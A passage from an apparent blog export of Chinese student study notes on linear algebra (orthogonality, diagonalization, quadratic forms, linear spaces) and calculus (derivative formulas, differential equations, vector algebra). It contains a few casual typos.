title="向量的内积"></a>向量的内积</h4><p>向量内积$(x,y)=x_1y_1+x_2y_2+…+x_ny_n$</p><ul><li>$(x,y)=(y,x)$</li><li>$(\lambda x,y)=\lambda(x,y)$</li><li>$(x+y,z)=(x,z)+(y,z)$</li><li>$(x,x) \geqslant 0$</li></ul><p>定义5.3 $||A||=\sqrt{(x,x)}$为$n$维向量$x$的长度（或范数）</p><ul><li>$||x||\geqslant 0$，等号成立当且仅当$x=0$</li><li>$||x||=|\lambda | ||x||$</li><li>$||x+y||\leqslant ||x|| +||y||$<br>单位向量$||x||=1$，单位化$\frac{x}{||x||}$<br>柯西-施瓦茨不等式$(x,y)^2\leqslant (x,x)(y,y)$或$|(x,y)|\leqslant ||x||\cdot ||y||$</li></ul><p>夹角$\theta =\arccos \frac{(x,y)}{||x||\cdot ||y||}$<br>$(x,y)=0$时称两向量正交，零向量与任何向量都正交<br>一组两两正交的非零向量，称为正交向量组</p><blockquote><p>定理5.1 正交向量组必定是线性无关组</p></blockquote><p>用正交向量组作向量空间的基，称为向量空间的正交基，若每个正交向量组的向量都是单位向量，则称为向量空间的正交规范基或标准正交基。</p><p>施密特正交化过程</p><script type="math/tex; mode=display">\begin{matrix}\beta_1= &\alpha_1\\ \beta_2= &\alpha_2-\frac{(\alpha_2,\beta_1)}{(\beta_1,\beta_1)}\beta_1\\ \beta_3= &\alpha_3-\frac{(\alpha_3,\beta_1)}{(\beta_1,\beta_1)}\beta_1-\frac{(\alpha_3,\beta_2)}{(\beta_2,\beta_2)}\beta_2\\ \cdots \cdots\\ \beta_r= & \alpha_r-\frac{(\alpha_r,\beta_1)}{(\beta_1,\beta_1)}\beta_1-\frac{(\alpha_r,\beta_2)}{(\beta_2,\beta_2)}\beta_2-\cdots-\frac{(\alpha_r,\beta_{r-1})}{(\beta_{r-1},\beta_{r-1})}\beta_{r-1}\end{matrix}</script><p>定义5.5 如果$n$阶方阵$A$满足，$A^{T}A=E(A^{-1}=A^{T})$，那么称$A$为<strong>正交矩阵</strong></p><blockquote><p>定理5.2 设$A,B$都是$n$阶正交矩阵，则<br>(1)$|A|=\pm 1$<br>(2)$A$的列（行）向量组是两两正交的单位向量<br>(3)$A^{T}(A^{-1})$也是正交矩阵<br>(4)$AB$也是正交矩阵<br>注： $A$为正交矩阵，当且仅当$A$的列（行）向量组为正交规范向量组<br>由此可见，正交矩阵$A$的$n$歌列（行）向量构成的向量空间$R^n$的一个正交规范基</p></blockquote><h4 id="相似矩阵"><a href="#相似矩阵" class="headerlink" title="相似矩阵"></a>相似矩阵</h4><p>定义5.6 设$A,B$都是$n$阶方阵，如果存在一个可逆矩阵$P$，使得$P^{-1}AP=B$，则称$A$与$B$是相似的，$P^{-1}AP$陈给对$A$做相似变换，可逆矩阵$P$称为把$A$变成$B$的相似变换矩阵</p><ul><li>$E^{-1}AE=A$</li><li>$P^{-1}AP=B,(P^{-1})^{-1}BP^{-1}=A$</li><li>$P^{-1}AP=B,Q^{-1}BQ=C,(PQ)^{-1}A(PQ)=C$<br>相似矩阵性质</li><li>性质1 相思举着扭矩有相同的秩及相同的行列式</li><li>性质2 相似矩阵若可逆，则其逆矩阵也相似</li><li>若$A$与$B$相似，则$A^k$与$B^k$也相似</li></ul><blockquote><p>定理5.3 相似矩阵有相同的特征多项式及相同的特征值（你明天不成立）</p></blockquote><h4 id="方阵对角化"><a href="#方阵对角化" class="headerlink" title="方阵对角化"></a>方阵对角化</h4><blockquote><p>定理5.4 $n$阶方阵$A$与对角阵相似的充分必要条件是：$A$有$n$个线性无关的特征向量<br>方阵$A$如果能够对角化，则对角矩阵$\Lambda$在不计入$\lambda_k$的排列顺序时是惟一的，称为$A$的相似标准形<br>$P^{-1}AP=\Lambda$，其中$P$是由特征向量的列向量组成的。</p></blockquote><ul><li>推论1 $n$阶方阵$A$若有$n$个不同的特征值，则$A$可对角化</li><li>推论2 如果对$n$阶方阵$A$的任一$k$重特征值$\lambda$，都有$r(A-\lambda E)=n-k$，则$A$可对角化</li></ul><h4 id="实对称矩阵的对角化"><a href="#实对称矩阵的对角化" class="headerlink" title="实对称矩阵的对角化"></a>实对称矩阵的对角化</h4><blockquote><p>定理5.5 实对称矩阵的特征值为实属<br>定理5.6 实对称矩阵对应于不同特征值的特征向量必正交<br>定理5.7 设$A$为$n$阶实对称矩阵，$\lambda$是$A$的$r$重特征值，则$r(A-\lambda E)=n-r$，从而矩阵$A$对应特征值$\lambda$恰有$r$个线性无关的特征向量<br>定理5.8 设$A$为$n$阶实对称矩阵，则必存在正交矩阵$P$，使得$P^{-1}AP=P^{T}AP=\Lambda$，其中$\Lambda$是以$A$的$n$个特征值为对角线元素的对角矩阵</p></blockquote><p>将每个对应于$r_j$重特征值$\lambda_j$的$r_j$个线性无关的特征向量正交化并单位化，即可得到$r_j$个单位正交特征向量，以所有特征值的正交化并单位化后特征向量为列向量构成正交矩阵$P$</p><h2 id="第六章-二次型"><a href="#第六章-二次型" class="headerlink" title="第六章 二次型"></a>第六章 二次型</h2><h3 id="第一节-二次型及其矩阵表示"><a href="#第一节-二次型及其矩阵表示" class="headerlink" title="第一节 二次型及其矩阵表示"></a>第一节 二次型及其矩阵表示</h3><h4 id="二次型基本概念"><a href="#二次型基本概念" class="headerlink" title="二次型基本概念"></a>二次型基本概念</h4><blockquote><p>定义6.1 含有$n$个变量$x_1,x_2,…,x_n$的二次齐次函数$f(x_1,x_2,…,x_n)=a_{11}x_1^2+a_{22}x_2^2+…+a_{nn}x_n^2+2a_{12}x_1x_2+2a_{13}x_1x_3+…+2a_{n-1,n}x_{n-1}x_n$ 称为<strong>二次型</strong></p></blockquote><p>当$a_{ij}$为复数时，$f$称为<strong>复二次型</strong>，为实数时称为<strong>实二次型</strong>。<br>将系数$a_{ij}$提出来形成一个矩阵$A$，对称阵$A$称为<strong>二次型$f$的矩阵</strong>，也称二次型$f$为<strong>对称阵$A$的二次型</strong>，矩阵$A$的秩叫作<strong>二次型$f$的秩</strong>。</p><h4 id="线性变换"><a href="#线性变换" class="headerlink" title="线性变换"></a>线性变换</h4><blockquote><p>定义6.2 矩阵表示$x=Cy$，$C$为线性变换的矩阵，当$|C|\neq 0$时，称线性变换为<strong>可逆的线性变换</strong>或<strong>非退化的线性变换</strong>；当$C$为正交矩阵时，称线性变换为<strong>正交线性变换</strong>，简称<strong>正交变换</strong>。</p></blockquote><h4 id="矩阵的合同"><a href="#矩阵的合同" class="headerlink" title="矩阵的合同"></a>矩阵的合同</h4><p>设$A,B$为$n$阶方阵，如果存在$n$阶可逆方阵$C$，使得$C^{T}AC=B$，则称$A$与$B$<strong>合同</strong>。<br>满足自反性、对称性、传递性、经过线性变换后对应矩阵依然合同。</p><h3 id="第二节-二次型的标准形"><a href="#第二节-二次型的标准形" class="headerlink" title="第二节 二次型的标准形"></a>第二节 二次型的标准形</h3><blockquote><p>定义6.4 若二次型经可逆线性变换后变成只含平方项的二次型，则称变换后的二次型为原二次型的<strong>标准形</strong>。</p></blockquote><h4 id="正交变换法"><a href="#正交变换法" class="headerlink" title="正交变换法"></a>正交变换法</h4><blockquote><p>定理6.1（主轴定理） 对任意一个$n$元实二次型$f=x^{T}Ax$，一定存在正交变换$x=Py$，使$f$化为标准形</p><script type="math/tex; mode=display">\lambda_1y_1^2+\lambda_2y_2^2+...+\lambda_ny_n^2</script><p>其中$\lambda_1,\lambda_2,…,\lambda_n$是$f$的矩阵$A$的$n$个特征值，正交矩阵$P$的$n$个列向量为$A$的对应于特征值的单位正交特征向量。</p></blockquote><h4 id="配方法"><a href="#配方法" class="headerlink" title="配方法"></a>配方法</h4><blockquote><p>定理6.2 任何一个二次型都可通过非退化的线性变换化为标准形。<br>若存在$a_{ii}\neq 0$，那么将其依次配方，例如$f=a_{11}[x_1+\frac{1}{a_{11}}(a_{12}x_2+…+a_{1n}x_n)]^2-\frac{1}{a_{11}}(a_{12}x_2+…+a_{1n}x_n)^2+a_{22}x_2^2+2a_{23}x_2x_3+…+a_{nn}x_n^2$，即可将前面的平方项对应$y_1$的线性变换，后面是对应的$n-1$元二次型。<br>若不存在$a_{ii}=0$，那么就令$x_1=y_1-y_2,x_2=y_1+y_2,x_3=y_3…,x_n=y_n$，即可得一个包含平方项的二次型。</p></blockquote><h4 id="初等变换法"><a href="#初等变换法" class="headerlink" title="初等变换法"></a>初等变换法</h4><p>由于$C^{T}AC=\Lambda$，转换成一系列初等矩阵$C=P_1P_2…P_s$，$C^{T}AC=P_s^{T}…P_2^{T}P_1^{T}AP_1P_2…P_s=\Lambda$，注意到$EP_1P_2…P_s=C$。<br>对$2n\times n$的矩阵$\begin{bmatrix}A\\E\end{bmatrix}$通过右乘$P_1P_2..P_s$的初等列变换，左乘$P_1^{T}P_2^{T}…P_n^{T}$的初等行变换。<br>变换后，$A$变成了$\Lambda$，$E$变成了$C$。</p><p>不花里胡哨的说（说人话），把第一行除第一个元素外，用列变换消成$0$；再把第一列除第一个元素外，用行变换消成$0$；依次做第二行、第二列…，最后消成一个对角矩阵。</p><h3 id="第三节-正定二次型"><a href="#第三节-正定二次型" class="headerlink" title="第三节 正定二次型"></a>第三节 正定二次型</h3><h4 id="惯性定理与规范形"><a href="#惯性定理与规范形" class="headerlink" title="惯性定理与规范形"></a>惯性定理与规范形</h4><blockquote><p>定理6.3（惯性定理） 在实二次型$f=x^{T}Ax$的标准形中，正系数的个数及负系数的个数是唯一确定的，与可逆线性变换无关。</p></blockquote><p>定义6.5 在实二次型$f$的标准形中，正系数个数$p$称为二次型$f$的<strong>正惯性系数</strong>，负系数个数$q$称为二次型$f$的<strong>负惯性系数</strong>。</p><p>将二次型变成如下形式$f=z_1^2+…+z_p^2-z_{p+1}^2-…z_r^2$，称为二次型的<strong>规范形</strong>。（大概是系数为$\pm 1$？）<br>由惯性定理知，任一实二次型的规范形唯一。</p><h4 id="二次型的有定型"><a href="#二次型的有定型" class="headerlink" title="二次型的有定型"></a>二次型的有定型</h4><p>定义6.6 设有实二次型$f=x^{T}Ax$，如果对任取的$x$<br>（1）$f\geqslant 0$，当且仅当$x=0$时，$f=0$，则称二次型$f$是<strong>正定二次型</strong>，而称对称矩阵$A$为<strong>正定矩阵</strong>；<br>（2）$f\leqslant 0$，当且仅当$x=0$时，$f=0$，则称二次型$f$是<strong>负定二次型</strong>，而称对阵矩阵$A$为<strong>负定矩阵</strong>；<br>（3）$f\geqslant 0$（或$f\leqslant 0$），则称二次型$f$是<strong>半正定</strong>（或<strong>半负定</strong>）<strong>二次型</strong>，同时称矩阵$A$是<strong>半正定矩阵</strong>（或<strong>半负定矩阵</strong>）。<br>（4）$f$的值有正有负，则称二次型$f$是<strong>不定的</strong></p><blockquote><p>定理6.4 $n$元二次型$f=x^{T}Ax$正（负）定的充分必要条件是：它的正（负）惯性指数为$n$。</p></blockquote><ul><li>推论1 对称矩阵$A$为正（负）定矩阵的充分必要条件是：$A$的特征值全为正（负）。</li><li>推论2 实二次型$f=x^{T}Ax$半正（负）定的充分必要条件是：它的正（负）惯性指数等于二次型的秩。</li><li>推论3 二次型经非退化线性变换后不改变它的有定性。</li><li>推论4 实对称矩阵$A$为正定矩阵的充分必要条件是：$A$与单位矩阵合同。</li></ul><blockquote><p>定理6.5 实对称矩阵$A$正定的充分必要条件是：存在可逆矩阵$C$，使得$A=C^{T}C$<br>定理6.6 设$A$为正定矩阵，则<br>（1）$A$的主对角线元$a_{ii}&gt;0$<br>（2）$|A|&gt;0$</p></blockquote><ul><li>推论5 设$A$为负定矩阵，则<br>（1）$A$的主对角元$a_{ii}<0$ （2）$|-a|="(-1)^n|A|">0$</0$></li></ul><p>定义6.7 设$A=(a_{ij})_ {n\times n}$，称</p><script type="math/tex; mode=display">|A_k|=\left | \begin{matrix}a_{11} & a_{12} & \cdots & a_{1k}\\a_{21} & a_{22} & \cdots & a_{2k}\\\vdots & \vdots & & \vdots\\a_{k1} & a_{k2} & \cdots & a_{kk}\end{matrix} \right |</script><p>为$A$的$k$阶<strong>顺序主子式</strong>。</p><blockquote><p>定理6.7 $n$阶实对称矩阵$A$正定的充分必要条件是：$A$的所有顺序主子式（$n$个）全大于零，称为<strong>赫尔维茨定理</strong>。</p></blockquote><ul><li>推论6 实对称矩阵$A$负定的充分必要条件是：奇数阶顺序主子式为负，偶数阶顺序主子式为正。</li></ul><h2 id="第七章-线性空间与线性变换简介"><a href="#第七章-线性空间与线性变换简介" class="headerlink" title="第七章 线性空间与线性变换简介"></a>第七章 线性空间与线性变换简介</h2><h3 id="第一节-线性空间的基本概念"><a href="#第一节-线性空间的基本概念" class="headerlink" title="第一节 线性空间的基本概念"></a>第一节 线性空间的基本概念</h3><h4 id="线性空间的定义与性质"><a href="#线性空间的定义与性质" class="headerlink" title="线性空间的定义与性质"></a>线性空间的定义与性质</h4><p>定义7.1 设$V$是一非空集合，$P$是一数域，如果在$V$中定义了以下两种运算：</p><ol><li>$\alpha +\beta=\beta + \alpha$</li><li>$(\alpha +\beta )+\gamma = \alpha + (\beta + \gamma)$</li><li>$\alpha + 0 = \alpha$</li><li>存在负元素$\beta=-\alpha$，$\alpha + \beta = 0$</li><li>$1\alpha = \alpha$</li><li>$\lambda(\mu \alpha)=(\lambda \mu)\alpha$</li><li>$(\lambda + \mu)\alpha=\lambda \alpha + \mu \lambda$</li><li>$\lambda(\alpha + \beta)=\lambda \alpha + \lambda \beta$<br>那么称$V$是数域$P$上的<strong>线性空间</strong>（或<strong>向量空间</strong>），简称<strong>线性空间</strong>，$V$中元素也称为<strong>向量</strong>。</li></ol><p>线性空间的加法和数量乘法称为<strong>线性运算</strong>。</p><ul><li>性质1 零元素是唯一的</li><li>性质2 每个元素的负元素是唯一的</li><li>性质3 $0\cdot \alpha=0,\lambda\cdot 0 = 0,(-1)\alpha=-\alpha$</li><li>性质4 若$\lambda \alpha =0$，则$\lambda=0$或$\alpha =0$</li></ul><p>定义7.2 设$L$是线性空间$V$的一个非空子集，若$L$对于$V$中所定义的加法和数乘运算也构成一个线性空间，则称$L$为$V$的一个<strong>线性子空间</strong>（简称<strong>子空间</strong>）。</p><blockquote><p>定理7.1 线性空间$V$的非空子集$L$构成子空间的充分必要条件是：$L$对$V$的加法与数乘运算封闭。</p></blockquote><p>定义7.3 线性空间$V$中，如果存在$n$个元素$\alpha_1,\alpha_2,…,\alpha_n$，满足这$n$个元素线性无关，并且$V$中的任意元素总能由这$n$个元素线性表示，就称这$n$个元素为线性空间$V$的一个<strong>基</strong>，$n$称为线性空间$V$的<strong>维数</strong>，记作$\text{dim}V=n$。维数为$n$的线性空间也称为<strong>$n$维线性空间</strong>。</p><p>定义7.4 设$\alpha_1,\alpha_2,…,\alpha_n$是线性空间$V$的一个基，对任一元素$\alpha \in V$，有唯一表达式$\alpha=x_1\alpha_1+x_2\alpha_2+…+x_n\alpha_n$，称有序数组$(x_1,x_2,…,x_n)$为元素$\alpha$在基$\alpha_1,\alpha_2,…,\alpha_n$下的<strong>坐标</strong>，并记作$\alpha=(x_1,x_2,…,x_n)$</p><h4 id="基坐标与坐标变换"><a href="#基坐标与坐标变换" class="headerlink" title="基坐标与坐标变换"></a>基坐标与坐标变换</h4><blockquote><p>定理7.2 设$n$维线性空间有两个不同的基$e_1,e_2,…,e_n$和$e_1’,e_2’,…,e_n’$且有$(e_1’,e_2’,…,e_n’)=(e_1,e_2,…,e_n)A$，其中$A$的第$j$列为$e_j’$在$e_1,e_2,…,e_n$下的坐标，这个公式叫做<strong>基变换公式</strong>，矩阵$A$称为<strong>过渡矩阵</strong>。<br>$\begin{pmatrix}x_1\\ x_2\\ \vdots\\ x_n\end{pmatrix}=A\begin{pmatrix}x_1’\\ x_2’\\ \vdots\\ x_n’\end{pmatrix}$或$\begin{pmatrix}x_1’\\ x_2’\\ \vdots\\ x_n’\end{pmatrix}=A^{-1}\begin{pmatrix}x_1\\ x_2\\ \vdots\\ x_n\end{pmatrix}$这个称为坐标变换公式。</p></blockquote><h3 id="第二节-线性变换"><a href="#第二节-线性变换" class="headerlink" title="第二节 线性变换"></a>第二节 线性变换</h3><p>设$V$为线性空间，把$V$到$V$的映射称为$V$的<strong>变换</strong>。</p><h4 id="线性变换的定义与性质"><a href="#线性变换的定义与性质" class="headerlink" title="线性变换的定义与性质"></a>线性变换的定义与性质</h4><p>定义7.5 数域$P$上的线性空间$V$的一个变换$T$称为<strong>线性变换</strong>，如果对于任意$x,y\in V,\lambda \in P$，都有$T(x+y)=T(x)+T(y),T(\lambda x)=\lambda T(x)$</p><h4 id="线性变换的矩阵表示"><a href="#线性变换的矩阵表示" class="headerlink" title="线性变换的矩阵表示"></a>线性变换的矩阵表示</h4><p>就是把每个元素都变换一下，竖着排列，系数形成一个矩阵。</p><blockquote><p>定理7.3 设$V$为$n$维线性空间，线性变换$T$在基$e_1,e_2,…,e_n$下的矩阵为$A$，则向量$x$与$T(x)$在基$e_1,e_2,…,e_n$下的坐标有关系式$T(x)=Ax,x=(x_1,x_2,…,x_n)^{T}$<br>定理7.4 两个基，基（I)到基（II）的过渡矩阵为$C$，$T$是$V$的线性变换，他在基(I),(II)下的矩阵分别为$A$和$B$，则$B=C^{-1}AC$</p></blockquote><h4 id="线性变换的运算"><a href="#线性变换的运算" class="headerlink" title="线性变换的运算"></a>线性变换的运算</h4><p>3种运算<br>和：$T(x)=T_1(x)+T_2(x)$，记作$T=T_1+T_2$<br>数量乘积：$T(x)=\lambda(T_1(x))$，记作$T=\lambda T_1$<br>乘积：$T(x)=T_1(T_2(x))$，记作$T=T_1T_2$</p><p>定义7.6 设$I$是线性空间$V$的单位线性变换，$T$为$V$的线性变换，如果存在$V$的一个变换$S$，使得$TS=ST=I$，则称线性变换$T$是可逆的，而$S$称为$T$的逆变换，记作$T^{-1}$</p><blockquote><p>定理7.5 设线性空间$V$的线性变换$T_1,T_2$在$V$的某个基下的矩阵分别为$A$和$B$，则在这个基下，有<br>(1)$T_1+T_2$的矩阵为$A+B$<br>(2)$\lambda T_1$的矩阵为$\lambda A$<br>(3)$T_1T_2$的矩阵为$AB$<br>(4)若$T_1$可逆，则$A$可逆，且逆变换$T^{-1}$的矩阵为$A^{-1}$</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> math </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高等数学笔记</title>
      <link href="/blog/note-math/"/>
      <url>/blog/note-math/</url>
      
        <content type="html"><![CDATA[<p>Update 2019.6.22<br>ps.为了加快复习速度可能不会太详细了…，有时后做了笔记并不会立刻同步上来<br>下学期好好做人…学的时候就记笔记…</p><hr><p>Update 2019.6.25<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\def\ooint&#123;&#123;\bigcirc&#125;\kern-11.5pt&#123;\int&#125;\kern-6.5pt&#123;\int&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>自定义闭合曲线二重积分<br>但是这里…用不了，我就用普通二重积分代替了</p><hr><p>Update 2019.6.26<br>差不多都复习了一遍了…最后几节实在是看不下去了，等下周再搞搞，还一直没有做套题，做上几套题再复习一下<br>找时间还会在整理上学期的积分方法，不然稍微复杂点就忘咋算了</p><hr><p>Update 2019.7.6</p><p>补充微分方程和修改部分错误</p><hr><p>Update 2019.7.7</p><p>常系数非齐次线性微分方程还有傅里叶级数我放弃了…考到的话…分给你15我点了</p><hr><h2 id="第二章-导数与微分"><a href="#第二章-导数与微分" class="headerlink" title="第二章 导数与微分"></a>第二章 导数与微分</h2><p>就光补充一下求导公式<br>$\sec x=\frac{1}{\cos x}, \csc x=\frac{1}{\sin x}$</p><ol><li>$(C)’=0$</li><li>$(x^{\mu})=\mu x^{\mu -1}$</li><li>$(\sin x)’=\cos x$</li><li>$(\cos x)’=-\sin x$</li><li>$(\tan x)’=\sec^2 x$</li><li>$(\cot x)’=-\csc ^2 x$</li><li>$(\sec x)’=\sec x\tan x$</li><li>$(\csc x)’=-\csc x\cot x$</li><li>$(a^x)’=a^x\ln a$</li><li>$(e^x)’=e^x$</li><li>$(\log_a x)’=\frac{1}{x\ln a}$</li><li>$(\ln x)’=\frac{1}{x}$</li><li>$(\arcsin x)’=\frac{1}{\sqrt{1-x^2}}$</li><li>$(\arccos x)’=-\frac{1}{\sqrt{1-x^2}}$</li><li>$(\arctan x)’=\frac{1}{1+x^2}$</li><li>$(\text{arccot} x)’=-\frac{1}{1+x^2}$</li></ol><p>和差积商求导法则</p><ol><li>$(u\pm v)’=u’\pm v’$</li><li>$(Cu)’=Cu’$</li><li>$(uv)’=u’v+uv’$</li><li>$\left (\frac{u}{v} \right )’=\frac{u’v-uv’}{v^2}$</li></ol><h2 id="第七章-微分方程"><a href="#第七章-微分方程" class="headerlink" title="第七章 微分方程"></a>第七章 微分方程</h2><h3 id="第一节-微分方程基本概念"><a href="#第一节-微分方程基本概念" class="headerlink" title="第一节 微分方程基本概念"></a>第一节 微分方程基本概念</h3><p>一般地，凡是表示未知函数、未知函数的导数与自变量之间关系的方程，叫做<strong>微分方程</strong>，微分方程中所出现的未知函数的最高阶导数的阶数，称为<strong>微分方程的阶</strong>。<br>找到一个函数代入微分方程使其称为恒等式，这个函数叫做<strong>微分方程的解</strong>，如果微分方程的解中含有任意成熟，且任意常数的个数与微分方程的阶数相同，这样的解叫做<strong>微分方程的通解</strong>。<br>满足一定条件的如$y|_ {x=x_0}=y_0,y’|_ {x=x_0}=y’_ 0$，叫做初值条件，确定了通解中任意常数以后，就得到<strong>微分方程的特解</strong>。</p><h3 id="第二节-可分离变量的微分方程"><a href="#第二节-可分离变量的微分方程" class="headerlink" title="第二节 可分离变量的微分方程"></a>第二节 可分离变量的微分方程</h3><p>简单来说，把含$x$的函数和$\text{d}x$放在等式一边，将$y,\text{d}y$放在等式另一边，分别积分求解。<br>一般地，如果一个一阶微分方程能写成$g(y)\text{d}y=f(x)\text{d}x$的形式，积分得$\int g(y)\text{d}y=\int f(x)\text{d}x$，设原函数分别为$G(y),F(x)$，即$G(y)=F(x)+C$</p><h3 id="第三节-齐次方程"><a href="#第三节-齐次方程" class="headerlink" title="第三节 齐次方程"></a>第三节 齐次方程</h3><p>如果一阶微分方程可化为$\frac{\text{d}y}{\text{d}x}=\varphi \left (\frac{y}{x}\right )$的形式，那么称这方程为齐次方程。<br>引入未知变量$u=\frac{y}{x}$，则$y=ux,\frac{\text{d}y}{\text{d}x}=u+x\frac{\text{d}u}{\text{d}x}$，代入得$u+x\frac{\text{d}u}{\text{d}x}=\varphi(u)$<br>然后分离变量$\frac{\text{d}u}{\varphi(u)-u}=\frac{\text{d}x}{x}$</p><h3 id="第四节-一阶线性微分方程"><a href="#第四节-一阶线性微分方程" class="headerlink" title="第四节 一阶线性微分方程"></a>第四节 一阶线性微分方程</h3><p>方程$\frac{\text{d}y}{\text{d}x}+P(x)y=Q(x)$叫做一阶线性微分方程，对于未知函数$y$及其导数是一次方程，如果$Q(x)\equiv 0$那么方程是齐次的，否则是非齐次的。</p><p>为求非齐次方程的解，先求对应的齐次线性方程$\frac{\text{d}y}{\text{d}x}+P(x)y=0$，可分离变量$\frac{\text{d}y}{y}=-P(x)\text{d}x$，积分得$\ln |y| =-\int P(x)\text{d}x+C_1$或$y=Ce^{-\int P(x)\text{d}x}(C=\pm e^{C_1})$<br>用常数变易法，把通解中的$C$换成$x$的未知函数$u(x)$，即$y=ue^{-\int P(x)\text{d}x}$，于是$\frac{\text{d}y}{\text{d}x}=u’e^{-\int P(x)\text{d}x}-uP(x)e^{-\int P(x)\text{d}x}$，代入方程得$u’e^{-\int P(x)\text{d}x}-uP(x)e^{-\int P(x)\text{d}x}+P(x)ue^{-\int P(x)\text{d}x}=Q(x)$<br>即$u’e^{-\int P(x)\text{d}x}=Q(x),u’=Q(x)e^{\int P(x)\text{d}x}$，两端积分得$u=\int Qe^{\int P(x)\text{d}x}\text{d}x+C$<br>通解$y=e^{-\int P(x)\text{d}x}\left ( \int Q(x)e^{\int P(x)\text{d}x}\text{d}x+C\right )$</p><h3 id="第五节-可降阶的高阶微分方程"><a href="#第五节-可降阶的高阶微分方程" class="headerlink" title="第五节 可降阶的高阶微分方程"></a>第五节 可降阶的高阶微分方程</h3><p>$y^{(n)}=f(x)$，接连积分$n$次，得到含有$n$个任意常数的通解</p><p>$y’’=f(x,y’)$，设$y’=p$，那么$p’=f(x,p)$，设其通解$p=\varphi(x,C_1),p=\frac{\text{d}y}{\text{d}x}$，因此$\frac{\text{d}y}{\text{d}x}=\varphi(x,C_1)$，积分得到通解$y=\int \varphi(x,C_1)\text{d}x+C_2$</p><p>$y’’=f(y,y’)$，令$y’=p$，$y’’=\frac{\text{d}p}{\text{d}x}=\frac{\text{d}p}{\text{d}y}\cdot \frac{\text{d}y}{\text{d}x}=p\frac{\text{d}p}{\text{d}y}$，方程变成$p\frac{\text{d}p}{\text{d}y}=f(y,p)$，通解$y’=p=\varphi(y,C_1)$，分离变量并积分$\int \frac{\text{d}y}{\varphi(y,C_1)}=x+C_1$</p><h3 id="第六节-高阶线性微分方程"><a href="#第六节-高阶线性微分方程" class="headerlink" title="第六节 高阶线性微分方程"></a>第六节 高阶线性微分方程</h3><p>二阶齐次线性方程$y’’+P(x)y’+Q(x)y=0$<br>定理1 如果函数$y_1(x)$与$y_2(x)$是方程的两个解，那么$y=C_1y_1(x)+C_2y_2(x)$，也是解<br>定理2 如果函数$y_1(x)$与$y_2(x)$是方程的两个线性无关的特解，那么$y=C_1y_1(x)+C_2y_2(x)$是方程的通解<br>定理3 设$y^{\ast}$是二阶非齐次方程的一个特解，$Y(x)$是对应齐次方程的通解，则二阶非齐次方程的通解$y=Y(x)+y^{\ast}(x)$</p><p>另叠加原理，右边是两个函数的和的形式，分别求特解，特解的和是原方程的特解。</p><h3 id="第七节-常系数齐次线性微分方程"><a href="#第七节-常系数齐次线性微分方程" class="headerlink" title="第七节 常系数齐次线性微分方程"></a>第七节 常系数齐次线性微分方程</h3><p>$y’’+py’+qy=0$，其中$p,q$全为常数那么称为二阶常系数齐次微分方程，不全为常数称为二阶变系数齐次微分方程。<br>特征方程$r^2+pr+q=0$，用二次方程求解</p><ul><li>两个不相等的实根$r_1,r_2$，通解$y=C_1e^{r_1x}+C_2e^{r_2x}$</li><li>两个相等实根$r_1=r_2$，通解$y=(C_1+C_2x)e^{r_1x}$</li><li>一对共轭负根$r_{1,2}=\alpha + \beta \text{i}$，通解$y=e^{\alpha x}(C_1 \cos \beta x + C_2\sin \beta x$</li></ul><h3 id="第八节-常系数非齐次线性微分方程"><a href="#第八节-常系数非齐次线性微分方程" class="headerlink" title="第八节 常系数非齐次线性微分方程"></a>第八节 常系数非齐次线性微分方程</h3><p>$y’’+py’+qy=f(x)$二阶常系数非齐次线性微分方程</p><ul><li><p>$f(x)=e^{\lambda x}P_m(x)$<br>结论$y^{\ast}=x^kR_m(x)e^{\lambda x}$，$k$按$\lambda $不是特征方程的根，是特征方程的单根，是特征方程的重根依次取$0,1,2$</p></li><li><p>$f(x)=e^{\lambda x}[P_l(x)\cos \omega x+Q_n(x)\sin \omega x]$<br>$y^{\ast}=x^ke^{\lambda x}[R_m^{(1)}(x)\cos \omega x+R_m^{(2)}\sin \omega x]$，$k$按$\lambda + \omega\text{i}$不是特征方程的根，是特征方程的单根依次取$0,1$</p></li></ul><p>我觉得应该考不到吧…忒麻烦了</p><h2 id="第八章-向量代数与空间解析几何"><a href="#第八章-向量代数与空间解析几何" class="headerlink" title="第八章 向量代数与空间解析几何"></a>第八章 向量代数与空间解析几何</h2><h3 id="向量及其运算"><a href="#向量及其运算" class="headerlink" title="向量及其运算"></a>向量及其运算</h3><h4 id="方向角"><a href="#方向角" class="headerlink" title="方向角"></a>方向角</h4><p>向量$r$与三条坐标轴的夹角$\alpha \beta \gamma$称为向量$r$的<strong>方向角</strong><br>$\cos\alpha=\frac{x}{|r|},\cos\beta=\frac{y}{|r|},\cos\gamma=\frac{z}{|r|}$<br>由方向向量可知<br>$\cos^2\alpha+\cos^2\beta+\cos^2\gamma=1$</p><h4 id="向量在轴上的投影"><a href="#向量在轴上的投影" class="headerlink" title="向量在轴上的投影"></a>向量在轴上的投影</h4><p>$Prj_ua=|a|\cos\varphi$<br>$Prj_u(a+b)=Prj_ua+Prj_ub$</p><h4 id="数量积"><a href="#数量积" class="headerlink" title="数量积"></a>数量积</h4><p>$a\cdot b=|a||b|\cos\theta=|a|Prj_ab=|b|Prj_ba=a_xb_x+a_yb_y+a_zb_z$<br>$a\cdot a=|a|^2$<br>非零向量$a,b$,$a\cdot b=0 \Leftrightarrow a\perp b$</p><h4 id="向量积"><a href="#向量积" class="headerlink" title="向量积"></a>向量积</h4><p>$c=a\times b,|c|=|a||b|\sin\theta,c$垂直于$a$与$b$所决定的平面，用右手定则，四指从$a$转向$b$，拇指指向$c$的方向。<br>$a\times a=0$<br>非零向量$ab$，$a\times b=0 \Leftrightarrow a//b$<br>$b\times a=-a\times b$<br>$a\times b= \left|\begin{matrix} i&amp; j &amp; k\\  a_x&amp;  a_y&amp; a_z\\  b_x&amp; b_y &amp; b_z\end{matrix}\right|$<br>同时，$a\times b$ 表示以$a,b$为边的平行四边形面积。</p><h4 id="混合积"><a href="#混合积" class="headerlink" title="混合积"></a>混合积</h4><script type="math/tex; mode=display">[abc]=(a\times b)\cdot c=\left|\begin{matrix}a_x&  a_y& a_z\\  b_x& b_y & b_z \\ c_x& c_y & c_z \end{matrix}\right|</script><p><strong>混合积</strong>的绝对值表示以向量$a,b,c$为棱的平行六面体体积，$a,b,c$若为右手系则正，左手系为负。</p><h3 id="平面表示方法"><a href="#平面表示方法" class="headerlink" 